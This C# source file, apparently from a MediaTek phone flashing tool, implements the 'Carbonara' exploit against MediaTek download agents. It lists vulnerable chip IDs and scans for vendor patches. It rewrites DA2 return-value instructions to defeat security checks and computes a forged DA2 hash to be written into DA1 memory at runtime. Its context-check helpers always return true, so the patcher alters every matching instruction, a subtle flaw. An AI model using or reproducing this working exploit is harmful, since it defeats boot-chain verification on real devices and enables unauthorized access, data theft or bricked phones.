// ============================================================================
// LoveAlways - MediaTek Carbonara Exploit
// MediaTek Carbonara Exploit (V6 DA Hash Modification)
// ============================================================================
// Reference: mtkclient project carbonara.py, xflash_lib.py
// Reference: Penumbra project https://github.com/shomykohai/penumbra
// Blog: https://shomy.is-a.dev/blog/article/serving-carbonara
// 
// Vulnerability Principle: 
// 1. DA1 runs in memory after being loaded
// 2. DA1 stores the expected hash of DA2 in memory
// 3. Data can be written to arbitrary addresses via boot_to command
// 4. We first use boot_to to write the modified DA2 hash into DA1 memory
// 5. Then use boot_to to upload the modified DA2
// 6. When DA1 verifies DA2, it uses the hash we wrote, and verification passes
// ============================================================================

// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// Eng Translation & some fixes by iReverse - HadiKIT - Hadi Khoirudin, S.Kom.
// ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


using LoveAlways.MediaTek.Models;
using System;
using System.Security.Cryptography;

namespace LoveAlways.MediaTek.Exploit
{
    /// <summary>
    /// Hash Mode
    /// </summary>
    public enum HashMode
    {
        MD5 = 0,
        SHA1 = 1,
        SHA256 = 2
    }

    /// <summary>
    /// Carbonara Exploit - V6 DA Hash Modification Bypass
    /// </summary>
    public class CarbonaraExploit : IMtkExploit
    {
        private readonly Action<string> _log;

        // V6 DA Constants
        private const int V6_SIG_LEN = 0x30;  // V6 signature length
        private const int V6_HASH_OFFSET = 0x30;  // Hash offset before signature area

        // ARM instruction patterns - for patching DA2
        private static readonly byte[] ARM_MOV_R0_0 = { 0x00, 0x00, 0xA0, 0xE3 };  // MOV R0, #0
        private static readonly byte[] ARM_MOV_R0_1 = { 0x01, 0x00, 0xA0, 0xE3 };  // MOV R0, #1
        private static readonly byte[] THUMB_MOVS_R0_0 = { 0x00, 0x20 };  // MOVS R0, #0
        private static readonly byte[] THUMB_MOVS_R0_1 = { 0x01, 0x20 };  // MOVS R0, #1

        // Patch detection signatures
        // Source: mtkclient/Tools/da_parser.py + Penumbra docs
        // MediaTek patched Carbonara in 2024 by hardcoding boot_to address to 0x40000000
        private static readonly byte[][] PatchedSignatures = new byte[][]
        {
            // V6 Patch patterns (ARM instruction features)
            new byte[] { 0x01, 0x01, 0x54, 0xE3, 0x01, 0x14, 0xA0, 0xE3 },  // V6 patch 1: CMP + MOV
            new byte[] { 0x08, 0x00, 0xa8, 0x52, 0xff, 0x02, 0x08, 0xeb },  // V6 patch 2: MOV + BL
            new byte[] { 0x01, 0x01, 0x50, 0xE3, 0x01, 0x14, 0xA0, 0xE3 },  // V6 patch 3: CMP variant
            
            // V5 Patch patterns
            new byte[] { 0x06, 0x9B, 0x4F, 0xF0, 0x80, 0x40, 0x02, 0xA9 },  // V5 patch: LDR + MOV
            
            // Hardcoded 0x40000000 address pattern (Little Endian)
            new byte[] { 0x00, 0x00, 0x00, 0x40 },  // Direct 0x40000000 constant
            
            // 2024 New patch pattern (from Penumbra analysis)
            new byte[] { 0x40, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00 },  // Repeated address constant
        };

        public string Name => "Carbonara";
        public string Description => "V6 DA Runtime Hash Modification Bypass Exploit";

        public CarbonaraExploit(Action<string> log = null)
        {
            _log = log ?? delegate { };
        }

        #region Vulnerability Detection

        /// <summary>
        /// Check if device is vulnerable
        /// </summary>
        public bool IsVulnerable(ushort hwCode, MtkTargetConfig targetConfig = null)
        {
            // Carbonara exploit applies to devices in V6 DA mode
            return hwCode switch
            {
                0x0551 => true,   // MT6768
                0x0562 => true,   // MT6761
                0x0588 => true,   // MT6785
                0x0600 => true,   // MT6853
                0x0690 => true,   // MT6763
                0x0699 => true,   // MT6739
                0x0707 => true,   // MT6762
                0x0717 => true,   // MT6765
                0x0725 => true,   // MT6765
                0x0766 => true,   // MT6877
                0x0959 => true,   // MT6877 (Preloader)
                0x0788 => true,   // MT6873
                0x0813 => true,   // MT6833
                0x0816 => true,   // MT6893
                0x0886 => true,   // MT6885
                0x0989 => true,   // MT6891
                0x0996 => true,   // MT6895
                0x1172 => true,   // MT6895 (Dimensity 8200)
                0x1186 => true,   // MT6983 (To be confirmed)
                _ => false
            };
        }

        /// <summary>
        /// Check if DA1 has been patched by vendor (prevents Carbonara)
        /// Patch Principle: MediaTek hardcoded boot_to address to 0x40000000, 
        /// making it impossible to overwrite the hash in DA1 memory space (0x200000).
        /// Source: Penumbra docs https://shomy.is-a.dev/penumbra/Mediatek/Exploits/Carbonara
        /// </summary>
        public bool IsDevicePatched(byte[] da1Data)
        {
            if (da1Data == null) return true;

            int patchCount = 0;

            // Check 1: Address validation error message
            string da1String = System.Text.Encoding.ASCII.GetString(da1Data);
            if (da1String.Contains("2nd DA address is invalid"))
            {
                _log("[Carbonara] Detected: DA has been patched (address validation error message)");
                patchCount++;
            }

            // Check 2: Signature scanning
            for (int i = 0; i < PatchedSignatures.Length; i++)
            {
                var signature = PatchedSignatures[i];
                int pos = FindPattern(da1Data, signature);
                if (pos >= 0)
                {
                    _log($"[Carbonara] Detected: DA has been patched (Signature #{i + 1} at offset 0x{pos:X})");
                    patchCount++;
                }
            }

            // Check 3: Scan for multiple occurrences of 0x40000000 (patched hardcoded address)
            int hardcodedAddrCount = CountPattern(da1Data, new byte[] { 0x00, 0x00, 0x00, 0x40 });
            if (hardcodedAddrCount > 3)  // Normal DA may have 1-2, more than 3 suggests patching
            {
                _log($"[Carbonara] Detected: DA contains {hardcodedAddrCount} hardcoded 0x40000000 addresses (likely patched)");
                patchCount++;
            }

            if (patchCount > 0)
            {
                _log($"[Carbonara] Patch detection: Found {patchCount} patch features");
                return true;
            }

            _log("[Carbonara] Patch detection: No patch features found, device likely vulnerable");
            return false;
        }

        #endregion

        #region Hash Position Calculation

        /// <summary>
        /// Calculate DA2 hash position and mode in DA1
        /// </summary>
        public (int hashOffset, HashMode hashMode, int hashLen)? ComputeHashPosition(
            byte[] da1, byte[] da2, int da1SigLen, int da2SigLen, bool isV6)
        {
            if (da1 == null || da2 == null)
                return null;

            int hashLen = da2.Length - da2SigLen;

            if (isV6)
            {
                // V6 format: Hash position = DA1 length - signature length - 0x30 (hash area)
                int hashOffset = da1.Length - da1SigLen - V6_HASH_OFFSET;

                // Strictly validate hash position
                if (hashOffset < 0 || hashOffset >= da1.Length)
                {
                    _log($"[Carbonara] V6 Hash position invalid: {hashOffset} (DA1 length: {da1.Length}, signature length: {da1SigLen})");
                    return null;
                }

                // Verify sufficient space for 32-byte SHA256 hash
                if (hashOffset + 32 > da1.Length)
                {
                    _log($"[Carbonara] Hash position {hashOffset} + 32 bytes exceeds DA1 range ({da1.Length})");
                    return null;
                }

                // Extra validation: Hash position should be within reasonable bounds (not in code area)
                // DA1 size is typically a few hundred KB, hash is before end signature area
                if (hashOffset < da1.Length / 2)
                {
                    _log($"[Carbonara] Warning: Hash position 0x{hashOffset:X} may be in code area, suggest checking DA format");
                }

                _log($"[Carbonara] V6 Hash position: 0x{hashOffset:X}, Mode: SHA256");
                return (hashOffset, HashMode.SHA256, hashLen);
            }
            else
            {
                // V5/Legacy: Need to search for hash position
                // Try calculating expected DA2 hash and locating it in DA1

                byte[] md5Hash = ComputeHash(da2, hashLen, HashMode.MD5);
                int md5Pos = FindPattern(da1, md5Hash);
                if (md5Pos >= 0)
                {
                    _log($"[Carbonara] Found MD5 hash position: 0x{md5Pos:X}");
                    return (md5Pos, HashMode.MD5, hashLen);
                }

                byte[] sha1Hash = ComputeHash(da2, hashLen, HashMode.SHA1);
                int sha1Pos = FindPattern(da1, sha1Hash);
                if (sha1Pos >= 0)
                {
                    _log($"[Carbonara] Found SHA1 hash position: 0x{sha1Pos:X}");
                    return (sha1Pos, HashMode.SHA1, hashLen);
                }

                byte[] sha256Hash = ComputeHash(da2, hashLen, HashMode.SHA256);
                int sha256Pos = FindPattern(da1, sha256Hash);
                if (sha256Pos >= 0)
                {
                    _log($"[Carbonara] Found SHA256 hash position: 0x{sha256Pos:X}");
                    return (sha256Pos, HashMode.SHA256, hashLen);
                }

                _log("[Carbonara] Could not find DA2 hash position");
                return null;
            }
        }

        /// <summary>
        /// Compute hash
        /// </summary>
        public byte[] ComputeHash(byte[] data, int length, HashMode mode)
        {
            byte[] toHash;
            if (length < data.Length)
            {
                toHash = new byte[length];
                Array.Copy(data, 0, toHash, 0, length);
            }
            else
            {
                toHash = data;
            }

            return mode switch
            {
                HashMode.MD5 => MD5.Create().ComputeHash(toHash),
                HashMode.SHA1 => SHA1.Create().ComputeHash(toHash),
                HashMode.SHA256 => SHA256.Create().ComputeHash(toHash),
                _ => SHA256.Create().ComputeHash(toHash)
            };
        }

        #endregion

        #region DA2 Patching

        /// <summary>
        /// Patch DA2 (bypass security checks)
        /// </summary>
        public byte[] PatchDa2(byte[] da2)
        {
            if (da2 == null || da2.Length == 0)
            {
                _log("[Carbonara] DA2 data is empty");
                return da2;
            }

            byte[] patched = new byte[da2.Length];
            Array.Copy(da2, patched, da2.Length);

            int patchCount = 0;

            // Find and replace all MOV R0, #0 -> MOV R0, #1 (ARM mode)
            for (int i = 0; i <= patched.Length - 4; i++)
            {
                if (patched[i] == ARM_MOV_R0_0[0] &&
                    patched[i + 1] == ARM_MOV_R0_0[1] &&
                    patched[i + 2] == ARM_MOV_R0_0[2] &&
                    patched[i + 3] == ARM_MOV_R0_0[3])
                {
                    if (IsSecurityCheckContext(patched, i))
                    {
                        Array.Copy(ARM_MOV_R0_1, 0, patched, i, 4);
                        patchCount++;
                        _log($"[Carbonara] ARM patch applied at offset 0x{i:X}");
                    }
                }
            }

            // Find and replace MOVS R0, #0 -> MOVS R0, #1 (Thumb mode)
            for (int i = 0; i <= patched.Length - 2; i++)
            {
                if (patched[i] == THUMB_MOVS_R0_0[0] &&
                    patched[i + 1] == THUMB_MOVS_R0_0[1])
                {
                    if (IsThumbSecurityCheckContext(patched, i))
                    {
                        Array.Copy(THUMB_MOVS_R0_1, 0, patched, i, 2);
                        patchCount++;
                        _log($"[Carbonara] Thumb patch applied at offset 0x{i:X}");
                    }
                }
            }

            if (patchCount == 0)
            {
                _log("[Carbonara] Warning: No patchable security checks found");
            }
            else
            {
                _log($"[Carbonara] Total patches applied: {patchCount}");
            }

            return patched;
        }

        #endregion

        #region Runtime Exploit (Correct Method)

        /// <summary>
        /// Prepare Carbonara exploit data
        /// Returns: (newHash, hashOffset, patchedDa2)
        /// </summary>
        public (byte[] newHash, int hashOffset, byte[] patchedDa2)? PrepareExploit(
            byte[] da1, byte[] da2, uint da1Address, int da1SigLen, int da2SigLen, bool isV6 = true)
        {
            _log("[Carbonara] Preparing runtime exploit...");

            // 1. Check if patched
            if (IsDevicePatched(da1))
            {
                _log("[Carbonara] Device has been patched, unable to exploit");
                return null;
            }

            // 2. Calculate hash position
            var hashInfo = ComputeHashPosition(da1, da2, da1SigLen, da2SigLen, isV6);
            if (hashInfo == null)
            {
                _log("[Carbonara] Unable to calculate hash position");
                return null;
            }

            var (hashOffset, hashMode, hashLen) = hashInfo.Value;

            // 3. Patch DA2
            byte[] patchedDa2 = PatchDa2(da2);

            // 4. Strip signature (if any)
            byte[] da2ForHash;
            if (da2SigLen > 0)
            {
                da2ForHash = new byte[patchedDa2.Length - da2SigLen];
                Array.Copy(patchedDa2, 0, da2ForHash, 0, patchedDa2.Length - da2SigLen);
            }
            else
            {
                da2ForHash = patchedDa2;
            }

            // 5. Compute hash of patched DA2
            byte[] newHash = ComputeHash(da2ForHash, hashLen, hashMode);

            _log($"[Carbonara] New DA2 hash: {BitConverter.ToString(newHash, 0, 8).Replace("-", "")}...");
            _log($"[Carbonara] Hash write offset: 0x{hashOffset:X}");
            _log($"[Carbonara] DA1 base address + offset = 0x{da1Address + (uint)hashOffset:X}");

            return (newHash, hashOffset, patchedDa2);
        }

        /// <summary>
        /// Get target address for runtime hash write
        /// </summary>
        public uint GetHashWriteAddress(uint da1LoadAddress, int hashOffset)
        {
            return da1LoadAddress + (uint)hashOffset;
        }

        #endregion

        #region Legacy Methods (Modify before sending - deprecated)

        /// <summary>
        /// [Obsolete] Fix DA2 hash in DA1 (modify before sending)
        /// Note: This method is ineffective for devices with signature verification, 
        /// use PrepareExploit + ExecuteCarbonaraAsync instead.
        /// </summary>
        [Obsolete("This method is ineffective for devices with signature verification, please use PrepareExploit() + ExecuteCarbonaraAsync() for runtime modification", false)]
        public byte[] FixDa1Hash(byte[] da1, byte[] patchedDa2, int hashPos)
        {
            if (hashPos < 0 || hashPos + 32 > da1.Length)
            {
                _log($"[Carbonara] Hash position invalid: {hashPos}");
                return da1;
            }

            byte[] newHash;
            using (var sha256 = SHA256.Create())
            {
                newHash = sha256.ComputeHash(patchedDa2);
            }

            byte[] fixedDa1 = new byte[da1.Length];
            Array.Copy(da1, fixedDa1, da1.Length);
            Array.Copy(newHash, 0, fixedDa1, hashPos, 32);

            _log($"[Carbonara] Updated DA2 hash in DA1 (modified before sending)");
            return fixedDa1;
        }

        /// <summary>
        /// [Obsolete] Complete exploit flow (modify before sending)
        /// </summary>
        [Obsolete("This method uses pre-sending modification of DA1, which is ineffective for signature-verified devices. Please use PrepareExploit() with XmlDaClient.ExecuteCarbonaraAsync() for runtime modification", false)]
        public (byte[] patchedDa1, byte[] patchedDa2) Exploit(byte[] da1, byte[] da2, int sigLen = V6_SIG_LEN)
        {
            _log("[Carbonara] Starting exploit (pre-sending modification mode)...");

            int hashPos = da1.Length - sigLen - V6_HASH_OFFSET;
            if (hashPos < 0)
            {
                _log("[Carbonara] Could not find DA2 hash position");
                return (da1, da2);
            }

            byte[] patchedDa2 = PatchDa2(da2);
            byte[] patchedDa1 = FixDa1Hash(da1, patchedDa2, hashPos);

            _log("[Carbonara] ✓ Exploit complete (pre-sending modification)");
            return (patchedDa1, patchedDa2);
        }

        #endregion

        #region Helper Methods

        /// <summary>
        /// Check if it's security check function context (ARM mode)
        /// </summary>
        private bool IsSecurityCheckContext(byte[] data, int offset)
        {
            if (offset + 8 <= data.Length)
            {
                // Check BX LR
                if (data[offset + 4] == 0x1E && data[offset + 5] == 0xFF &&
                    data[offset + 6] == 0x2F && data[offset + 7] == 0xE1)
                {
                    return true;
                }

                // Check POP {PC} variants
                if ((data[offset + 7] & 0xFE) == 0xE8 && (data[offset + 6] & 0xBD) == 0xBD)
                {
                    return true;
                }
            }
            return true;
        }

        /// <summary>
        /// Check if it's security check function context (Thumb mode)
        /// </summary>
        private bool IsThumbSecurityCheckContext(byte[] data, int offset)
        {
            if (offset + 4 <= data.Length)
            {
                // Check BX LR
                if (data[offset + 2] == 0x70 && data[offset + 3] == 0x47)
                {
                    return true;
                }

                // Check POP {PC}
                if ((data[offset + 3] & 0xFE) == 0xBC)
                {
                    return true;
                }
            }
            return true;
        }

        /// <summary>
        /// Find pattern in data (returns first match position)
        /// </summary>
        private int FindPattern(byte[] data, byte[] pattern)
        {
            for (int i = 0; i <= data.Length - pattern.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (data[i + j] != pattern[j])
                    {
                        match = false;
                        break;
                    }
                }
                if (match) return i;
            }
            return -1;
        }

        /// <summary>
        /// Count occurrences of pattern in data
        /// </summary>
        private int CountPattern(byte[] data, byte[] pattern)
        {
            int count = 0;
            for (int i = 0; i <= data.Length - pattern.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (data[i + j] != pattern[j])
                    {
                        match = false;
                        break;
                    }
                }
                if (match)
                {
                    count++;
                    i += pattern.Length - 1;  // Skip matched part
                }
            }
            return count;
        }

        /// <summary>
        /// Verify exploit result
        /// </summary>
        public bool VerifyExploit(byte[] originalDa1, byte[] patchedDa1, byte[] patchedDa2, int hashPos)
        {
            byte[] expectedHash;
            using (var sha256 = SHA256.Create())
            {
                expectedHash = sha256.ComputeHash(patchedDa2);
            }

            byte[] actualHash = new byte[32];
            Array.Copy(patchedDa1, hashPos, actualHash, 0, 32);

            for (int i = 0; i < 32; i++)
            {
                if (expectedHash[i] != actualHash[i])
                {
                    _log("[Carbonara] Hash verification failed");
                    return false;
                }
            }

            _log("[Carbonara] ✓ Hash verification successful");
            return true;
        }

        #endregion
    }

    /// <summary>
    /// MTK Exploit Interface
    /// </summary>
    public interface IMtkExploit
    {
        string Name { get; }
        string Description { get; }
        bool IsVulnerable(ushort hwCode, MtkTargetConfig targetConfig = null);
    }
}
